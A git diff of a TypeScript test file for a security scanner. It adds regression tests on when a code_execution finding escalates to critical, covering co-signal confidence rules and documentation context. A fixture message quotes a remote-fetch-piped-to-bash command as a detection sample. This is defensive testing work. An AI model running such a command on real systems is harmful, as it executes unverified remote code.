@@ -43,13 +43,17 @@ import {
 const PATH_A_MESSAGE = /co-occurring with exfiltration\/privilege\/credential signals/
 const PATH_B_MESSAGE = /corroborated by two independent advisory-tier signals/
 
-const codeExecFinding = (lineNumber = 1): SecurityFinding => ({
+const codeExecFinding = (
+  lineNumber = 1,
+  overrides: Partial<SecurityFinding> = {}
+): SecurityFinding => ({
   type: 'code_execution',
   severity: 'medium',
   message: 'Remote fetch piped to an interpreter: "curl https://example.com/setup.sh | bash"',
   lineNumber,
   inDocumentationContext: false,
   confidence: 'high',
+  ...overrides,
 })
 
 const coSignal = (
@@ -256,6 +260,69 @@ describe('SMI-6033 Wave 4 (Gap 6) — path (b): two distinct advisory-tier co-si
       codeExecFinding(),
       coSignal('decoy_misdirection'),
       coSignal('paste_host_fetch', { confidence: 'low' }),
+    ]
+    escalateCodeExecution(findings)
+    expect(findings[0].severity).toBe('medium')
+  })
+
+  // Adversarial-review regression (2026-08-16): a blanket `confidence !==
+  // 'low'` relaxation (this file's earlier revision) let TWO fuzzy
+  // medium-confidence signals co-escalate a weak code_execution finding —
+  // archive_evasion's prose-only sub-signal (explicitly documented as "the
+  // fuzzy, FP-prone case" in SecurityScanner.archive.ts) plus
+  // decoy_misdirection's no-authority-affix form are BOTH confidence:'medium'
+  // by construction, and neither alone implies malice. Only paste_host_fetch
+  // gets the medium-confidence carve-out now; every other type must reach
+  // confidence:'high' to count.
+  it('does NOT escalate on two fuzzy medium-confidence signals outside the paste_host_fetch exception (adversarial-review regression)', () => {
+    const findings = [
+      codeExecFinding(),
+      coSignal('decoy_misdirection', { confidence: 'medium' }),
+      coSignal('archive_evasion', { confidence: 'medium' }),
+    ]
+    escalateCodeExecution(findings)
+    expect(findings[0].severity).toBe('medium')
+  })
+
+  it('DOES escalate when paste_host_fetch (medium confidence, exception) pairs with a high-confidence second type', () => {
+    const findings = [
+      codeExecFinding(),
+      coSignal('paste_host_fetch', { confidence: 'medium' }),
+      coSignal('archive_evasion', { confidence: 'high' }),
+    ]
+    escalateCodeExecution(findings)
+    expect(findings[0].severity).toBe('critical')
+    expect(findings[0].message).toMatch(PATH_B_MESSAGE)
+  })
+
+  it("does NOT escalate when a non-exception type (decoy_misdirection) carries confidence:'medium', even paired with a second medium-confidence non-exception type", () => {
+    const findings = [
+      codeExecFinding(),
+      coSignal('decoy_misdirection', { confidence: 'medium' }),
+      coSignal('gatekeeper_bypass', { confidence: 'medium' }),
+    ]
+    escalateCodeExecution(findings)
+    expect(findings[0].severity).toBe('medium')
+  })
+
+  // Adversarial-review regression (2026-08-16): escalateCodeExecution never
+  // checked the code_execution finding's OWN doc-context, only the
+  // co-signal's — so a fenced security-research example could still be
+  // escalated by two real (non-doc) co-signals elsewhere in the document.
+  it('does NOT escalate when the code_execution finding itself is inDocumentationContext, even with two qualifying non-doc co-signals (adversarial-review regression)', () => {
+    const findings = [
+      codeExecFinding(1, { inDocumentationContext: true }),
+      coSignal('archive_evasion', { confidence: 'high' }),
+      coSignal('paste_host_fetch', { confidence: 'medium' }),
+    ]
+    escalateCodeExecution(findings)
+    expect(findings[0].severity).toBe('medium')
+  })
+
+  it('does NOT escalate on path (a) either when the code_execution finding itself is inDocumentationContext', () => {
+    const findings = [
+      codeExecFinding(1, { inDocumentationContext: true }),
+      coSignal('data_exfiltration', { severity: 'high' }),
     ]
     escalateCodeExecution(findings)
     expect(findings[0].severity).toBe('medium')
